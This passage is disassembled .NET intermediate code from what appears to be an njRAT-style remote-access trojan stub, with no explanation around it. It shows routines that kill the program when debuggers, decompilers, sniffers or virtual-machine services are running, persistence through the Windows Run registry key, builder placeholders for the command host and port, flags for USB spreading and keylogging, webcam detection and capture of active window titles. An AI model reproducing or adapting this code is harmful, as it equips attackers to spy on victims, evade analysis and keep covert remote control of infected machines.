    IL_0147:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_014c:  nop
    IL_014d:  nop
    IL_014e:  ldloc.s    V_37
    IL_0150:  ldc.i4.1
    IL_0151:  add.ovf
    IL_0152:  stloc.s    V_37
    IL_0154:  ldloc.s    V_37
    IL_0156:  ldloc.s    V_36
    IL_0158:  ldlen
    IL_0159:  conv.i4
    IL_015a:  clt
    IL_015c:  stloc.s    V_38
    IL_015e:  ldloc.s    V_38
    IL_0160:  brtrue.s   IL_0140

    IL_0162:  ldstr      "smsniff"
    IL_0167:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_016c:  stloc.s    V_39
    IL_016e:  ldc.i4.0
    IL_016f:  stloc.s    V_40
    IL_0171:  br.s       IL_0187

    IL_0173:  ldloc.s    V_39
    IL_0175:  ldloc.s    V_40
    IL_0177:  ldelem.ref
    IL_0178:  stloc.s    process8
    IL_017a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_017f:  nop
    IL_0180:  nop
    IL_0181:  ldloc.s    V_40
    IL_0183:  ldc.i4.1
    IL_0184:  add.ovf
    IL_0185:  stloc.s    V_40
    IL_0187:  ldloc.s    V_40
    IL_0189:  ldloc.s    V_39
    IL_018b:  ldlen
    IL_018c:  conv.i4
    IL_018d:  clt
    IL_018f:  stloc.s    V_41
    IL_0191:  ldloc.s    V_41
    IL_0193:  brtrue.s   IL_0173

    IL_0195:  ldstr      "exeinfoPE"
    IL_019a:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_019f:  stloc.s    V_42
    IL_01a1:  ldc.i4.0
    IL_01a2:  stloc.s    V_43
    IL_01a4:  br.s       IL_01ba

    IL_01a6:  ldloc.s    V_42
    IL_01a8:  ldloc.s    V_43
    IL_01aa:  ldelem.ref
    IL_01ab:  stloc.s    process9
    IL_01ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b2:  nop
    IL_01b3:  nop
    IL_01b4:  ldloc.s    V_43
    IL_01b6:  ldc.i4.1
    IL_01b7:  add.ovf
    IL_01b8:  stloc.s    V_43
    IL_01ba:  ldloc.s    V_43
    IL_01bc:  ldloc.s    V_42
    IL_01be:  ldlen
    IL_01bf:  conv.i4
    IL_01c0:  clt
    IL_01c2:  stloc.s    V_44
    IL_01c4:  ldloc.s    V_44
    IL_01c6:  brtrue.s   IL_01a6

    IL_01c8:  ldstr      "NetSnifferCs"
    IL_01cd:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01d2:  stloc.s    V_45
    IL_01d4:  ldc.i4.0
    IL_01d5:  stloc.s    V_46
    IL_01d7:  br.s       IL_01ed

    IL_01d9:  ldloc.s    V_45
    IL_01db:  ldloc.s    V_46
    IL_01dd:  ldelem.ref
    IL_01de:  stloc.s    process10
    IL_01e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01e5:  nop
    IL_01e6:  nop
    IL_01e7:  ldloc.s    V_46
    IL_01e9:  ldc.i4.1
    IL_01ea:  add.ovf
    IL_01eb:  stloc.s    V_46
    IL_01ed:  ldloc.s    V_46
    IL_01ef:  ldloc.s    V_45
    IL_01f1:  ldlen
    IL_01f2:  conv.i4
    IL_01f3:  clt
    IL_01f5:  stloc.s    V_47
    IL_01f7:  ldloc.s    V_47
    IL_01f9:  brtrue.s   IL_01d9

    IL_01fb:  ldstr      "Sandboxie Control"
    IL_0200:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0205:  stloc.s    V_48
    IL_0207:  ldc.i4.0
    IL_0208:  stloc.s    V_49
    IL_020a:  br.s       IL_0220

    IL_020c:  ldloc.s    V_48
    IL_020e:  ldloc.s    V_49
    IL_0210:  ldelem.ref
    IL_0211:  stloc.s    process11
    IL_0213:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0218:  nop
    IL_0219:  nop
    IL_021a:  ldloc.s    V_49
    IL_021c:  ldc.i4.1
    IL_021d:  add.ovf
    IL_021e:  stloc.s    V_49
    IL_0220:  ldloc.s    V_49
    IL_0222:  ldloc.s    V_48
    IL_0224:  ldlen
    IL_0225:  conv.i4
    IL_0226:  clt
    IL_0228:  stloc.s    V_50
    IL_022a:  ldloc.s    V_50
    IL_022c:  brtrue.s   IL_020c

    IL_022e:  ldstr      "processhacker"
    IL_0233:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0238:  stloc.s    V_51
    IL_023a:  ldc.i4.0
    IL_023b:  stloc.s    V_52
    IL_023d:  br.s       IL_0253

    IL_023f:  ldloc.s    V_51
    IL_0241:  ldloc.s    V_52
    IL_0243:  ldelem.ref
    IL_0244:  stloc.s    process12
    IL_0246:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_024b:  nop
    IL_024c:  nop
    IL_024d:  ldloc.s    V_52
    IL_024f:  ldc.i4.1
    IL_0250:  add.ovf
    IL_0251:  stloc.s    V_52
    IL_0253:  ldloc.s    V_52
    IL_0255:  ldloc.s    V_51
    IL_0257:  ldlen
    IL_0258:  conv.i4
    IL_0259:  clt
    IL_025b:  stloc.s    V_53
    IL_025d:  ldloc.s    V_53
    IL_025f:  brtrue.s   IL_023f

    IL_0261:  ldstr      "dnSpy"
    IL_0266:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_026b:  stloc.s    V_54
    IL_026d:  ldc.i4.0
    IL_026e:  stloc.s    V_55
    IL_0270:  br.s       IL_0286

    IL_0272:  ldloc.s    V_54
    IL_0274:  ldloc.s    V_55
    IL_0276:  ldelem.ref
    IL_0277:  stloc.s    process15
    IL_0279:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_027e:  nop
    IL_027f:  nop
    IL_0280:  ldloc.s    V_55
    IL_0282:  ldc.i4.1
    IL_0283:  add.ovf
    IL_0284:  stloc.s    V_55
    IL_0286:  ldloc.s    V_55
    IL_0288:  ldloc.s    V_54
    IL_028a:  ldlen
    IL_028b:  conv.i4
    IL_028c:  clt
    IL_028e:  stloc.s    V_56
    IL_0290:  ldloc.s    V_56
    IL_0292:  brtrue.s   IL_0272

    IL_0294:  ldstr      "CodeReflect"
    IL_0299:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_029e:  stloc.s    V_57
    IL_02a0:  ldc.i4.0
    IL_02a1:  stloc.s    V_58
    IL_02a3:  br.s       IL_02b9

    IL_02a5:  ldloc.s    V_57
    IL_02a7:  ldloc.s    V_58
    IL_02a9:  ldelem.ref
    IL_02aa:  stloc.s    process16
    IL_02ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02b1:  nop
    IL_02b2:  nop
    IL_02b3:  ldloc.s    V_58
    IL_02b5:  ldc.i4.1
    IL_02b6:  add.ovf
    IL_02b7:  stloc.s    V_58
    IL_02b9:  ldloc.s    V_58
    IL_02bb:  ldloc.s    V_57
    IL_02bd:  ldlen
    IL_02be:  conv.i4
    IL_02bf:  clt
    IL_02c1:  stloc.s    V_59
    IL_02c3:  ldloc.s    V_59
    IL_02c5:  brtrue.s   IL_02a5

    IL_02c7:  ldstr      "Reflector"
    IL_02cc:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02d1:  stloc.s    V_60
    IL_02d3:  ldc.i4.0
    IL_02d4:  stloc.s    V_61
    IL_02d6:  br.s       IL_02ec

    IL_02d8:  ldloc.s    V_60
    IL_02da:  ldloc.s    V_61
    IL_02dc:  ldelem.ref
    IL_02dd:  stloc.s    process17
    IL_02df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02e4:  nop
    IL_02e5:  nop
    IL_02e6:  ldloc.s    V_61
    IL_02e8:  ldc.i4.1
    IL_02e9:  add.ovf
    IL_02ea:  stloc.s    V_61
    IL_02ec:  ldloc.s    V_61
    IL_02ee:  ldloc.s    V_60
    IL_02f0:  ldlen
    IL_02f1:  conv.i4
    IL_02f2:  clt
    IL_02f4:  stloc.s    V_62
    IL_02f6:  ldloc.s    V_62
    IL_02f8:  brtrue.s   IL_02d8

    IL_02fa:  ldstr      "ILSpy"
    IL_02ff:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0304:  stloc.s    V_63
    IL_0306:  ldc.i4.0
    IL_0307:  stloc.s    V_64
    IL_0309:  br.s       IL_031f

    IL_030b:  ldloc.s    V_63
    IL_030d:  ldloc.s    V_64
    IL_030f:  ldelem.ref
    IL_0310:  stloc.s    process18
    IL_0312:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0317:  nop
    IL_0318:  nop
    IL_0319:  ldloc.s    V_64
    IL_031b:  ldc.i4.1
    IL_031c:  add.ovf
    IL_031d:  stloc.s    V_64
    IL_031f:  ldloc.s    V_64
    IL_0321:  ldloc.s    V_63
    IL_0323:  ldlen
    IL_0324:  conv.i4
    IL_0325:  clt
    IL_0327:  stloc.s    V_65
    IL_0329:  ldloc.s    V_65
    IL_032b:  brtrue.s   IL_030b

    IL_032d:  ldstr      "VGAuthService"
    IL_0332:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0337:  stloc.s    V_66
    IL_0339:  ldc.i4.0
    IL_033a:  stloc.s    V_67
    IL_033c:  br.s       IL_0352

    IL_033e:  ldloc.s    V_66
    IL_0340:  ldloc.s    V_67
    IL_0342:  ldelem.ref
    IL_0343:  stloc.s    process19
    IL_0345:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_034a:  nop
    IL_034b:  nop
    IL_034c:  ldloc.s    V_67
    IL_034e:  ldc.i4.1
    IL_034f:  add.ovf
    IL_0350:  stloc.s    V_67
    IL_0352:  ldloc.s    V_67
    IL_0354:  ldloc.s    V_66
    IL_0356:  ldlen
    IL_0357:  conv.i4
    IL_0358:  clt
    IL_035a:  stloc.s    V_68
    IL_035c:  ldloc.s    V_68
    IL_035e:  brtrue.s   IL_033e

    IL_0360:  ldstr      "VBoxService"
    IL_0365:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_036a:  stloc.s    V_69
    IL_036c:  ldc.i4.0
    IL_036d:  stloc.s    V_70
    IL_036f:  br.s       IL_0385

    IL_0371:  ldloc.s    V_69
    IL_0373:  ldloc.s    V_70
    IL_0375:  ldelem.ref
    IL_0376:  stloc.s    process20
    IL_0378:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_037d:  nop
    IL_037e:  nop
    IL_037f:  ldloc.s    V_70
    IL_0381:  ldc.i4.1
    IL_0382:  add.ovf
    IL_0383:  stloc.s    V_70
    IL_0385:  ldloc.s    V_70
    IL_0387:  ldloc.s    V_69
    IL_0389:  ldlen
    IL_038a:  conv.i4
    IL_038b:  clt
    IL_038d:  stloc.s    V_71
    IL_038f:  ldloc.s    V_71
    IL_0391:  brtrue.s   IL_0371

    IL_0393:  ret
  } // end of method CsAntiProcess::Handler

  .method public static void  Start() cil managed
  {
    // Code size       56 (0x38)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.r8     5.
    IL_000a:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000f:  stsfld     class [System]System.Timers.Timer Stub.CsAntiProcess::Timer
    IL_0014:  ldsfld     class [System]System.Timers.Timer Stub.CsAntiProcess::Timer
    IL_0019:  ldnull
    IL_001a:  ldftn      void Stub.CsAntiProcess::Handler(object,
                                                          class [System]System.Timers.ElapsedEventArgs)
    IL_0020:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0025:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_002a:  nop
    IL_002b:  ldsfld     class [System]System.Timers.Timer Stub.CsAntiProcess::Timer
    IL_0030:  ldc.i4.1
    IL_0031:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0036:  nop
    IL_0037:  ret
  } // end of method CsAntiProcess::Start

} // end of class Stub.CsAntiProcess

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool Anti_CH
  .field public static bool IsF
  .field public static bool USB_SP
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string VR
  .field public static string Y
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       276 (0x114)
    .maxstack  1
    IL_0000:  ldc.i4     0x1401
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  stsfld     uint8[] j.OK::b
    IL_000f:  ldstr      "[BD]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool j.OK::BD
    IL_001e:  ldnull
    IL_001f:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0024:  ldc.i4.0
    IL_0025:  stsfld     bool j.OK::Cn
    IL_002a:  ldstr      "[DR]"
    IL_002f:  stsfld     string j.OK::DR
    IL_0034:  ldstr      "[EXE]"
    IL_0039:  stsfld     string j.OK::EXE
    IL_003e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0043:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0048:  ldstr      "[H]"
    IL_004d:  stsfld     string j.OK::H
    IL_0052:  ldstr      "[Idr]"
    IL_0057:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005c:  stsfld     bool j.OK::Idr
    IL_0061:  ldstr      "[Anti_CH]"
    IL_0066:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006b:  stsfld     bool j.OK::Anti_CH
    IL_0070:  ldstr      "[Isf]"
    IL_0075:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007a:  stsfld     bool j.OK::IsF
    IL_007f:  ldstr      "[USB_SP]"
    IL_0084:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0089:  stsfld     bool j.OK::USB_SP
    IL_008e:  ldstr      "[Isu]"
    IL_0093:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0098:  stsfld     bool j.OK::Isu
    IL_009d:  ldnull
    IL_009e:  stsfld     class j.kl j.OK::kq
    IL_00a3:  ldstr      ""
    IL_00a8:  stsfld     string j.OK::lastcap
    IL_00ad:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_00b2:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_00b7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_00bc:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00c1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00c6:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_00cb:  ldnull
    IL_00cc:  stsfld     object j.OK::MT
    IL_00d1:  ldstr      "[P]"
    IL_00d6:  stsfld     string j.OK::P
    IL_00db:  ldnull
    IL_00dc:  stsfld     object j.OK::PLG
    IL_00e1:  ldstr      "[RG]"
    IL_00e6:  stsfld     string j.OK::RG
    IL_00eb:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00f0:  stsfld     string j.OK::sf
    IL_00f5:  ldstr      "[VN]"
    IL_00fa:  stsfld     string j.OK::VN
    IL_00ff:  ldstr      "0.7d"
    IL_0104:  stsfld     string j.OK::VR
    IL_0109:  ldstr      "Y262SUCZ4UJJ"
    IL_010e:  stsfld     string j.OK::Y
    IL_0113:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  castclass  uint8[]
    IL_0007:  call       void j.OK::Ind(uint8[])
    IL_000c:  nop
    IL_000d:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void j.OK::ED()
    IL_0006:  nop
    IL_0007:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       125 (0x7d)
    .maxstack  3
    .locals init ([0] string ACT,
             [1] string str,
             [2] native int foregroundWindow,
             [3] string winTitle,
             [4] bool V_4,
             [5] class [mscorlib]System.Exception exception1,
             [6] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  call       native int j.OK::GetForegroundWindow()
      IL_0007:  stloc.2
      IL_0008:  ldloc.2
      IL_0009:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000e:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0013:  stloc.s    V_4
      IL_0015:  ldloc.s    V_4
      IL_0017:  brfalse.s  IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_007b

      IL_0021:  nop
      IL_0022:  ldloc.2
      IL_0023:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0028:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_002d:  ldc.i4.1
      IL_002e:  add.ovf
      IL_002f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0034:  stloc.3
      IL_0035:  ldloc.2
      IL_0036:  ldloca.s   winTitle
      IL_0038:  ldloc.3
      IL_0039:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_003e:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_0043:  pop
      IL_0044:  ldloca.s   winTitle
      IL_0046:  call       string j.OK::ENB(string&)
      IL_004b:  stloc.1
      IL_004c:  leave.s    IL_0076

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_004e:  dup
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0054:  stloc.s    exception1
      IL_0056:  nop
      IL_0057:  ldloc.s    exception1
      IL_0059:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_005e:  nop
      IL_005f:  ldloc.s    exception1
      IL_0061:  stloc.s    exception
      IL_0063:  ldstr      ""
      IL_0068:  stloc.1
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006e:  nop
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  nop
    IL_0077:  ldloc.1
    IL_0078:  stloc.0
    IL_0079:  br.s       IL_007b

    IL_007b:  ldloc.0
    IL_007c:  ret
  } // end of method OK::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init ([0] string BS)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       101 (0x65)
    .maxstack  5
    .locals init ([0] bool Cam,
             [1] int32 num,
             [2] string lpszVer,
             [3] bool V_3,
             [4] string V_4,
             [5] bool V_5,
             [6] class [mscorlib]System.Exception exception1,
             [7] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.1
      IL_0004:  nop
      IL_0005:  ldnull
      IL_0006:  stloc.2
      IL_0007:  ldloc.1
      IL_0008:  conv.ovf.i2
      IL_0009:  ldc.i4.s   100
      IL_000b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0010:  stloc.s    V_4
      IL_0012:  ldloca.s   V_4
      IL_0014:  ldc.i4.s   100
      IL_0016:  ldloca.s   lpszVer
      IL_0018:  ldc.i4.s   100
      IL_001a:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001f:  stloc.3
      IL_0020:  ldloc.3
      IL_0021:  brfalse.s  IL_0027

      IL_0023:  ldc.i4.1
      IL_0024:  stloc.0
      IL_0025:  leave.s    IL_0063

      IL_0027:  nop
      IL_0028:  ldloc.1
      IL_0029:  ldc.i4.1
      IL_002a:  add.ovf
      IL_002b:  stloc.1
      IL_002c:  nop
      IL_002d:  ldloc.1
      IL_002e:  ldc.i4.4
      IL_002f:  cgt
      IL_0031:  ldc.i4.0
      IL_0032:  ceq
      IL_0034:  stloc.s    V_5
      IL_0036:  ldloc.s    V_5
      IL_0038:  brtrue.s   IL_0004

      IL_003a:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.s    exception1
      IL_0044:  nop
      IL_0045:  ldloc.s    exception1
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  nop
      IL_004d:  ldloc.s    exception1
      IL_004f:  stloc.s    exception
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  nop
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  nop
    IL_005f:  ldc.i4.0
    IL_0060:  stloc.0
    IL_0061:  br.s       IL_0063

    IL_0063:  ldloc.0
    IL_0064:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       161 (0xa1)
    .maxstack  3
    .locals init ([0] bool CompDir,
             [1] bool V_1,
             [2] class [mscorlib]System.IO.DirectoryInfo directory,
             [3] class [mscorlib]System.IO.DirectoryInfo parent,
             [4] bool V_4,
             [5] bool V_5,
             [6] bool V_6,
             [7] bool V_7)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0007:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000c:  ldarg.1
    IL_000d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0012:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0017:  ldc.i4.0
    IL_0018:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001d:  ldc.i4.0
    IL_001e:  ceq
    IL_0020:  stloc.1
    IL_0021:  ldloc.1
    IL_0022:  brfalse.s  IL_009a

    IL_0024:  ldarg.0
    IL_0025:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002a:  stloc.2
    IL_002b:  ldarg.1
    IL_002c:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0031:  stloc.3
    IL_0032:  nop
    IL_0033:  ldloc.2
    IL_0034:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0039:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003e:  ldloc.3
    IL_003f:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0044:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0049:  ldc.i4.0
    IL_004a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_004f:  ldc.i4.0
    IL_0050:  cgt.un
    IL_0052:  stloc.s    V_4
    IL_0054:  ldloc.s    V_4
    IL_0056:  brfalse.s  IL_005c

    IL_0058:  ldc.i4.0
    IL_0059:  stloc.0
    IL_005a:  br.s       IL_009f

    IL_005c:  nop
    IL_005d:  ldloc.2
    IL_005e:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0063:  stloc.2
    IL_0064:  ldloc.3
    IL_0065:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_006a:  stloc.3
    IL_006b:  ldloc.2
    IL_006c:  ldnull
    IL_006d:  ceq
    IL_006f:  ldloc.3
    IL_0070:  ldnull
    IL_0071:  ceq
    IL_0073:  and
    IL_0074:  stloc.s    V_5
    IL_0076:  ldloc.s    V_5
    IL_0078:  brfalse.s  IL_007e

    IL_007a:  ldc.i4.1
    IL_007b:  stloc.0
    IL_007c:  br.s       IL_009f

    IL_007e:  nop
    IL_007f:  ldloc.2
    IL_0080:  ldnull
    IL_0081:  ceq
    IL_0083:  stloc.s    V_6
    IL_0085:  ldloc.s    V_6
    IL_0087:  brfalse.s  IL_008d

    IL_0089:  ldc.i4.0
    IL_008a:  stloc.0
    IL_008b:  br.s       IL_009f

    IL_008d:  nop
    IL_008e:  nop
    IL_008f:  ldloc.3
    IL_0090:  ldnull
    IL_0091:  cgt.un
    IL_0093:  stloc.s    V_7
    IL_0095:  ldloc.s    V_7
    IL_0097:  brtrue.s   IL_0032

    IL_0099:  nop
    IL_009a:  nop
    IL_009b:  ldc.i4.0
    IL_009c:  stloc.0
    IL_009d:  br.s       IL_009f

    IL_009f:  ldloc.0
    IL_00a0:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed
  {
    // Code size       739 (0x2e3)
    .maxstack  4
    .locals init ([0] bool connect,
             [1] class [mscorlib]System.IO.FileInfo lO,
             [2] object V_2,
             [3] bool V_3,
             [4] class [mscorlib]System.Exception exception1,
             [5] class [mscorlib]System.Exception exception,
             [6] class [mscorlib]System.Exception exception6,
             [7] class [mscorlib]System.Exception exception2,
             [8] class [mscorlib]System.Exception exception7,
             [9] class [mscorlib]System.Exception exception3,
             [10] string str,
             [11] bool V_11,
             [12] string V_12,
             [13] class [mscorlib]System.Exception exception8,
             [14] class [mscorlib]System.Exception exception4,
             [15] class [mscorlib]System.Exception exception9,
             [16] class [mscorlib]System.Exception exception5)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
